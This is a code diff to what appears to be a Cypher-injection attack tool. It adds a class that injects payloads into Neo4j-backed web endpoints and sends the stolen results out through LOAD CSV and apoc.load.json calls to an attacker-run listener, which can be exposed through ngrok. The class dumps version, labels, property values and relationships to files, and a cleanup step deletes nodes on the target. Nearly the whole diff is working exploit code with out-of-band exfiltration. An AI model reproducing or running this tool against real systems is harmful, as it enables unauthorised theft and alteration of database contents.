@@ -191,6 +191,360 @@ class Listener():
     def stop_listener(self):
         self.server.shutdown()
 
+class OoBNeo4jInjector:
+    """Handles the injection of payloads into a Neo4j database with out of band exfiltration."""
+    def __init__(self, target, exfil_ip, listen_port, request_type, parameters, cookie=None):
+        self.target = target
+        self.exfil_ip = f"{exfil_ip}:{str(listen_port)}"
+        self.request_type = request_type
+        self.parameters = parameters
+        self.cookie = cookie if cookie else ""
+        self.headers = {'User-Agent': 'curl/8.5.0', 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': self.cookie}
+        self.proxies = {}
+        #self.proxies = {'http': 'http://127.0.0.1:8080'}
+        self.exfil_payload = ""
+        self.working_char = "UNDEFINED"
+
+    def inject_payload(self, payload):
+        """Inject a crafted payload to the target and return the response object."""
+        responses = []
+        if (self.working_char != "UNDEFINED"):
+            full_payload = f"{self.working_char}{payload}"
+            encoded_payload = quote(full_payload, safe='')
+            url, data = self.prepare_request_data(encoded_payload)
+            response = self.execute_request(url, data)
+            responses.append(response)
+        else:
+            for injection_char in ["'", "\"", "'})", "\"})", ""]:
+                full_payload = f"{injection_char}{payload}"
+                encoded_payload = quote(full_payload, safe='')
+                url, data = self.prepare_request_data(encoded_payload)
+                response = self.execute_request(url, data)
+                responses.append(response)
+        return responses
+
+    def prepare_request_data(self, encoded_payload):
+        """Prepare the URL and data for the request."""
+        if self.request_type == "API":
+            url = f"{self.target}{self.parameters}{encoded_payload}"
+            data = None
+        elif self.request_type == "GET":
+            url = f"{self.target}?{self.parameters}={encoded_payload}"
+            data = None
+        elif self.request_type == "POST":
+            url = self.target
+            data = f"{self.parameters}={encoded_payload}"
+        else:
+            raise ValueError("Invalid request type")
+        return url, data
+
+    def execute_request(self, url, data=None):
+        """Execute the HTTP request with the prepared data and return the response."""
+        try:
+            response = requests.post(url, data=data, headers=self.headers, proxies=self.proxies, allow_redirects=False) if data else requests.get(url, headers=self.headers, proxies=self.proxies, allow_redirects=False)
+            if response.status_code == 302:
+                print(colored("302 Redirect, Cookies Expired/Invalid ?", "red"))
+                sys.exit()
+            return response  # Return the response object
+        except requests.exceptions.RequestException as e:
+            print(colored(f"Error occurred: {e}", "red"))
+        return None
+
+    # detects injection
+    def detect_inject(self):
+        animation = "|/-\\"
+        anim_index = 0
+        random.seed(time.strftime("%H:%M:%S", time.localtime()))
+        random_num = random.randint(0, 999)
+        csv_exfil = f"LOAD CSV FROM '{self.exfil_ip}/?data='+exfilData as l RETURN 1337 as x//"
+        apoc_exfil = f"CALL apoc.load.json('{self.exfil_ip}/?data='+exfilData) YIELD value RETURN 1337 as x//"
+        csv = False
+        apoc = False
+        print("")
+        injection_characters = ["'", "\"", "'})", "\"})", f"{random_num}"]
+        for injection_character in injection_characters:
+            print(f"[{animation[anim_index % len(animation)]}] Checking injectability with LOAD CSV", end='\r', flush=True)
+            anim_index += 1
+            self.working_char = injection_character
+            payload = f" RETURN 1 as x UNION WITH 1 as exfilData {csv_exfil}"
+            self.inject_payload(payload)
+            if (get_data()):
+                self.exfil_payload = csv_exfil
+                csv = True
+                break
+        for injection_character in injection_characters:
+            print(f"[{animation[anim_index % len(animation)]}] Checking injectability with APOC", end='\r', flush=True)
+            anim_index += 1
+            if (not csv):
+                self.working_char = injection_character
+            payload = f" RETURN 1 as x UNION WITH 1 as exfilData {apoc_exfil}"
+            self.inject_payload(payload)
+            if (get_data()):
+                self.exfil_payload = apoc_exfil
+                apoc = True
+                break
+            if (csv):
+                break
+
+        if (csv and apoc):
+            print("APOC detected, retrieving APOC version...")
+            self.inject_payload(f" RETURN 1 as x UNION WITH apoc.version() as exfilData {self.exfil_payload}")
+            apoc_version = get_data()
+            nested_dict = {'-': {'apoc_version': apoc_version}}
+            convert_dict_to_table(nested_dict)
+            check_vulnerability(apoc_version)
+            option = input("\nUse APOC to exfiltrate? (y|N): ").lower()
+            if option == "y":
+                self.exfil_payload = csv_exfil
+            else:
+                print("\n[*] Continuing with LOAD CSV [*]")
+            return True
+        
+        elif (csv and not apoc):
+            print("No APOC detected, continuing with LOAD CSV...")
+            return True
+        
+        elif (not csv and apoc):
+            print("Only APOC detected, continuing with APOC...")
+            return True
+        
+        elif (not csv and not apoc):
+            self.working_char = "UNDEFINED"
+            self.exfil_payload = csv_exfil
+            print(" " * 500, end='\r')
+            return False
+        
+    def get_version(self):
+        print("\n[*] Version Check [*]")
+        self.inject_payload(f" RETURN 1 as x UNION CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT replace(name,' ', '%20') as name,version,edition WITH name +':'+version+':'+edition as exfilData {self.exfil_payload}")
+
+        version_parts = get_data().split(':')
+        name, version, edition = version_parts[0], version_parts[1], version_parts[2]
+
+        if version_parts:
+            nested_dict = {'-': {'name': name, 'version': version, 'edition': edition}}
+            convert_dict_to_table(nested_dict)
+        elif ("apoc" not in self.exfil_payload):
+            if (input(colored("[!] LOAD CSV blocked, try with APOC? (y|N) ", "red")).lower() == "y"):
+                self.exfil_payload = f"CALL apoc.load.json('{self.exfil_ip}/?data='+exfilData) YIELD value RETURN 1337 as x//"
+                self.get_version()
+            sys.exit()
+        else:
+            print(colored("[!] Out of band exfiltration blocked", "red"))
+            sys.exit()
+
+        if edition == 'enterprise':
+            print(colored("\n[!] Neo4j Enterprise edition is detected, RBAC configuration could be blocking our payload.\n", "yellow"))
+
+    def dump_labels(self):
+        # dump label count
+        self.inject_payload(f" RETURN 1 as x UNION CALL db.labels() yield label WITH COUNT(DISTINCT label) as exfilData {self.exfil_payload}")
+
+        label_count = get_data()
+        
+        # dump labels
+        self.inject_payload(f" RETURN 1 as x UNION CALL db.labels() yield label WITH DISTINCT label as exfilData WITH COLLECT(exfilData) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
+
+        labels = get_data().split('::') 
+
+        print(f"\n[*] available labels [{label_count}]:")
+        for label in labels:
+            print(f"[+] {label}")
+
+        return labels
+    
+    def dump_node_count(self, label):
+        node_counts = []
+        # dump node count
+        self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WITH COUNT(DISTINCT x) as exfilData {self.exfil_payload}")
+        node_count = get_data()  
+        node_counts.append(node_count)
+
+        return node_count
+    
+    def dump_properties(self, label):
+        node_counts = []
+        # dump node count
+        self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WITH COUNT(DISTINCT x) as exfilData {self.exfil_payload}")
+        node_count = get_data()  
+        node_counts.append(node_count)
+
+        # Dump property count
+        self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as exfilData {self.exfil_payload}")
+
+        property_count = get_data()  
+
+        # dump properties
+        self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
+
+        print(f"\n[*] Label: {label}")
+        print(f"[+] available properties [{property_count}]:")
+        properties = get_data().split('::')
+
+        for pr0perty in properties:
+            print(f"[++] {pr0perty}")
+
+        return properties
+
+    def dump_values(self, label, pr0perty):
+        self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH id(x) + ':' + x.{pr0perty} as id_{pr0perty}  WITH COLLECT(DISTINCT(id_{pr0perty})) AS list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
+        parsed_data = get_parsed_data()
+        # replace key name to pr0perty variable
+        parsed_data[pr0perty] =  parsed_data.pop("data")
+
+        return parsed_data
+
+    def exfil_data(self):
+
+        if (self.exfil_payload == ""):
+            if (input("Detection has not been run yet, run detection? (y|N) ") == "y"):
+                if (self.detect_inject()):
+                    print()
+            else:
+                self.exfil_payload = f"LOAD CSV FROM '{self.exfil_ip}/?data='+exfilData as l RETURN 1337 as x//"
+        elif (self.exfil_payload == f"LOAD CSV FROM '{self.exfil_ip}/?data='+exfilData as l RETURN 1337 as x//"):
+            print("\n[*] APOC Check [*]")
+            self.inject_payload(f" RETURN 1 as x UNION WITH apoc.version() as exfilData {self.exfil_payload}")
+
+            apoc_version = get_data()
+            if apoc_version is None:
+                apoc_version = False
+            else:
+                nested_dict = {'-': {'apoc_version': apoc_version}}
+                convert_dict_to_table(nested_dict)
+
+            if apoc_version != False:
+                check_vulnerability(apoc_version)
+                option = input("\nUse APOC to exfiltrate? (y|N): ").lower()
+                if option == "y":
+                    self.exfil_payload = f"CALL apoc.load.json('{self.exfil_ip}/?data='+exfilData) YIELD value RETURN 1337 as x//" 
+                else:
+                    print("\n[*] Continuing with LOAD CSV [*]")
+
+        print("\n[*] Version Check [*]")
+        self.inject_payload(f" RETURN 1 as x UNION CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT replace(name,' ', '%20') as name,version,edition WITH name +':'+version+':'+edition as exfilData {self.exfil_payload}")
+
+        version_parts = get_data().split(':')
+        name, version, edition = version_parts[0], version_parts[1], version_parts[2]
+
+        if version_parts:
+            nested_dict = {'-': {'name': name, 'version': version, 'edition': edition}}
+            convert_dict_to_table(nested_dict)
+        else:
+            print(colored("[!] LOAD CSV blocked, try APOC", "red"))
+            sys.exit()
+
+        if edition == 'enterprise':
+            print(colored("\n[!] Neo4j Enterprise edition is detected, RBAC configuration could be blocking our payload.\n", "yellow"))
+
+        # dump label count
+        self.inject_payload(f" RETURN 1 as x UNION CALL db.labels() yield label WITH COUNT(DISTINCT label) as exfilData {self.exfil_payload}")
+
+        label_count = get_data()
+        
+        # dump labels
+        self.inject_payload(f" RETURN 1 as x UNION CALL db.labels() yield label WITH DISTINCT label as exfilData WITH COLLECT(exfilData) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
+
+        labels = get_data().split('::') 
+
+        print(f"\n[*] available labels [{label_count}]:")
+        for label in labels:
+            print(f"[+] {label}")
+
+        node_counts = []
+        for label in labels:
+            # dump node count
+            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WITH COUNT(DISTINCT x) as exfilData {self.exfil_payload}")
+            node_count = get_data()  
+            node_counts.append(node_count)
+
+            # Dump property count
+            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as exfilData {self.exfil_payload}")
+
+            property_count = get_data()  
+
+            # dump properties
+            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
+
+            print(f"\n[*] Label: {label}")
+            print(f"[+] available properties [{property_count}]:")
+            properties = get_data().split('::')
+
+            for pr0perty in properties:
+                print(f"[++] {pr0perty}")
+
+            properties_dict = {}
+            for pr0perty in properties:
+                self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH id(x) + ':' + x.{pr0perty} as id_{pr0perty}  WITH COLLECT(DISTINCT(id_{pr0perty})) AS list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
+                parsed_data = get_parsed_data()
+                # replace key name to pr0perty variable
+                parsed_data[pr0perty] =  parsed_data.pop("data")
+
+                properties_dict.update(parsed_data)
+
+            formatted_dict = fully_dynamic_convert_data(properties_dict)
+            write_json_to_file(formatted_dict, f'{label}.json')
+
+            print(f"[{node_count} entries]")
+            convert_dict_to_table(formatted_dict)
+
+        
+    def exfil_relationship(self):
+
+        print("\n[*] Using LOAD CSV to Exfiltrate Relationships [*]")
+        # dump relationship count
+        self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COUNT(DISTINCT(type(relationship))) as exfilData {self.exfil_payload}")
+
+        relationship_count = get_data()  
+
+        if relationship_count is None or relationship_count == '0':
+            print(colored("[!] The database might not have any relationships. Exiting...", "red"))
+            sys.exit()
+
+        # dump relationships type
+        self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
+
+        
+        print(f"\n[*] relationships types [{relationship_count}]:")
+        relationships = get_data().split('::')
+        for relationship in relationships:
+            print(f"[+] {relationship}")
+
+        # dump relationships
+        found_relationships = []
+        counter = 0 
+        for rel_type in relationships:
+            # Initial payload injection to get relationships list
+            self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 WITH toString(id(node1)) + ':{rel_type}:' + toString(id(node2)) as rows WITH COLLECT(rows) AS list WITH REDUCE(mergedString = '', value IN list | mergedString+value+'::') AS exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
+            
+            relationships_list = get_data().split('::')
+
+            for relationship in relationships_list:
+                relationship_parts = relationship.split(':')
+                id1, rel_type, id2 = relationship_parts[0], relationship_parts[1], relationship_parts[2]
+                # verify relationship
+                # process each relationship direction
+                for id_from, id_to in [(id1, id2), (id2, id1)]:
+                    self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[:{rel_type}]->(node2) WHERE id(node1) = {id_from} and id(node2) = {id_to} WITH DISTINCT node1, node2  UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + ':' + id(node1) + '-[:{rel_type}]-%3E' + label2 + ':' + id(node2) as exfilData {self.exfil_payload}")
+                    if not data_queue.empty():
+                        counter += 1
+                        relationship = get_data()
+                        found_relationships.append(relationship)
+            
+        print(f"\n[*] available relationships [{counter}]")
+        for rel_type in relationships:
+            print(f"[+] {rel_type}")
+            for relationship in found_relationships:
+                regex_rel_type = re.findall(r"\[:([^\]]+)\]", relationship)[0]
+                if regex_rel_type == rel_type:
+                    print(f"[++] {relationship}")
+
+
+
+    def clean_up(self):
+        self.inject_payload(" RETURN 1 as x UNION MATCH (n) WHERE ANY(key IN keys(n) WHERE n[key] IN [1337, '1337']) AND NOT EXISTS ((n)--()) DETACH DELETE n RETURN 1337 as x//")
+
+
 class Neo4jInjector:
     """Handles the injection of payloads into a Neo4j database."""
     def __init__(self, target, exfil_ip, listen_port, request_type, parameters, cookie=None, blind_string=""):
@@ -738,7 +1092,8 @@ def main():
     parser.add_argument("--labels", action="store_true", help="Dump labels")
     parser.add_argument("-L", "--label", help="Specify a label for property or value dumping")
     parser.add_argument("--properties", action="store_true", help="Dump properties for a specified label (-L)")
-    parser.add_argument("-P", "--property", help="Specify properties to dump values (-L must also be used)")
+    parser.add_argument("-P", "--property", help="Specify properties to dump values; to dump values of multiple properties, delimit each property with a comma (e.g. foo,bar) (-L must also be used)")
+    parser.add_argument("-R", "--relationships", action="store_true", help="Dump all relationships in the database")
 
     args = parser.parse_args()
 
@@ -751,29 +1106,89 @@ def main():
     if args.property and not args.label:
         parser.error("-P/--property requires -L/--label.")
 
-    listener = Listener(args.listen_port)
-    listener_thread = threading.Thread(target=listener.start_listener, daemon=True)
-    listener_thread.start() 
+    if (args.out_of_band):
+        listener = Listener(args.listen_port)
+        listener_thread = threading.Thread(target=listener.start_listener, daemon=True)
+        listener_thread.start() 
 
-    if args.int == "public":
-        ngrok_auth_token = os.getenv("NGROK_AUTHTOKEN")
-        if ngrok_auth_token:
-            ngrok.set_auth_token(ngrok_auth_token)
+        if args.int == "public":
+            ngrok_auth_token = os.getenv("NGROK_AUTHTOKEN")
+            if ngrok_auth_token:
+                ngrok.set_auth_token(ngrok_auth_token)
+            else:
+                print(colored("Ngrok auth token not set. Please set the NGROK_AUTHTOKEN environment variable.", "red"))
+                sys.exit(1)
+            start_ngrok = ngrok.connect(args.listen_port, "tcp")
+            url = start_ngrok.public_url.replace("tcp://", "http://")
+            hostname, port = url.split("://")[1].split(":")
+            args.exfil_ip = f"http://{hostname}"
+            args.listen_port = int(port)
+            
+            print(f"External IP: {args.exfil_ip}, External Port: {args.listen_port}")
+        elif args.int:
+            args.exfil_ip = f"http://{get_ip_address(args.int)}"
         else:
-            print(colored("Ngrok auth token not set. Please set the NGROK_AUTHTOKEN environment variable.", "red"))
-            sys.exit(1)
-        start_ngrok = ngrok.connect(args.listen_port, "tcp")
-        url = start_ngrok.public_url.replace("tcp://", "http://")
-        hostname, port = url.split("://")[1].split(":")
-        args.exfil_ip = f"http://{hostname}"
-        args.listen_port = int(port)
-        
-        print(f"External IP: {args.exfil_ip}, External Port: {args.listen_port}")
-    elif args.int:
-        args.exfil_ip = f"http://{get_ip_address(args.int)}"
-    else:
-        args.exfil_ip = "127.0.0.1"
+            args.exfil_ip = "127.0.0.1"
 
+        injector = OoBNeo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie)
+
+        if (injector.detect_inject()):
+            print(colored("[*] target likely injectable, continuing", "green"))
+            print(f"[+] working character: [{injector.working_char}]")
+        else:
+            still_inject = input(colored("Target likely not injectable, continue? (y/n default: n)", "red")).lower()
+            if still_inject != "y":
+                listener.stop_listener()
+                listener_thread.join()
+                return
+        injector.get_version()
+            
+        if (args.dump_all):
+            labels = injector.dump_labels()
+            for label in labels:
+                node_count = injector.dump_node_count(label)
+                properties = injector.dump_properties(label)
+                properties_dict = {}
+                for pr0perty in properties:
+                    parsed_data = injector.dump_values(label, pr0perty)
+                    properties_dict.update(parsed_data)
+
+                formatted_dict = fully_dynamic_convert_data(properties_dict)
+                write_json_to_file(formatted_dict, f'{label}.json')
+
+                print(f"[{node_count} entries]")
+                convert_dict_to_table(formatted_dict)
+            injector.exfil_relationship()
+
+        elif (args.labels):
+            labels = injector.dump_labels()
+        
+        elif (args.properties):
+            properties, node_count = injector.dump_properties(args.label)
+
+        elif (args.property):
+            properties = args.property.split(",")
+            node_count = injector.dump_node_count(args.label)
+            properties_dict = {}
+            for pr0perty in properties:
+                parsed_data = injector.dump_values(args.label, pr0perty)
+                properties_dict.update(parsed_data)
+
+            formatted_dict = fully_dynamic_convert_data(properties_dict)
+            write_json_to_file(formatted_dict, f'{args.label}.json')
+
+            print(f"[{node_count} entries]")
+            convert_dict_to_table(formatted_dict)
+
+        elif (args.relationships):
+            injector.exfil_relationship()
+
+        injector.clean_up()
+        listener.stop_listener()
+        listener_thread.join()
+        if args.int == "public":
+            ngrok.disconnect(start_ngrok.public_url)
+        return
 
     injector = Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie, args.blind_string)
 
@@ -817,11 +1232,6 @@ def main():
     # injector.exfil_relationship()
     # injector.clean_up()
 
-    listener.stop_listener()
-    listener_thread.join()
-
-    if args.int == "public":
-        ngrok.disconnect(start_ngrok.public_url)
 
 if __name__ == "__main__":
     main()
